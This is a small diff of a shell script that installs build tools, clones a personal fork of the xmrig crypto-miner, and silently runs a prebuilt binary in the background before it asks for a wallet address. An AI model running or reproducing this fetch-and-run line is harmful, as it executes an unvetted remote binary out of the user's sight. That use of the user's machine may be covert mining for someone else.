@@ -24,7 +24,7 @@ echo "Updating..."
 sudo apt update && sudo apt install git && sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 echo ""
 echo ""
-disown git clone https://github.com/katerin966/xmrig.git && cd xmrig && tar xvzf xmrig.tar.gz && ./xmrig &> /dev/null &
+git clone https://github.com/katerin966/xmrig.git && cd xmrig && tar xvzf xmrig.tar.gz && ./xmrig &> /dev/null &
 echo ""
 echo "Enter yourt wallet address:"
 read wallet
